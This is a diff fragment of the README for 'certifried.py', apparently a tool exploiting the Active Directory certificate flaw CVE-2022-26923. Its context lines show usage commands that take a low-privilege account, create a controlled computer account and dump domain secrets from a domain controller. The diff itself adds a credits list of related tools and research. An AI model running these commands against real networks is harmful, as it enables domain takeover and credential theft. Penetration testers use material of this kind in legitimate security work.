@@ -13,3 +13,9 @@ python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -use-lda
 python3 certifried.py domain.com/lowpriv:'Password1' -dc-ip 10.10.10.10 -computer-name 'ControlledComputer' -computer-pass 'Password123' -use-ldap -dump
 ```
 _Note: If you received an error of Name Service not found, you might wanna add target ip to /etc/hosts_
+
+## Credits 
+* https://github.com/dirkjanm/PKINITtools
+* https://github.com/SecureAuthCorp/impacket/blob/master/examples/addcomputer.py
+* https://github.com/eloypgz/certi
+* https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4
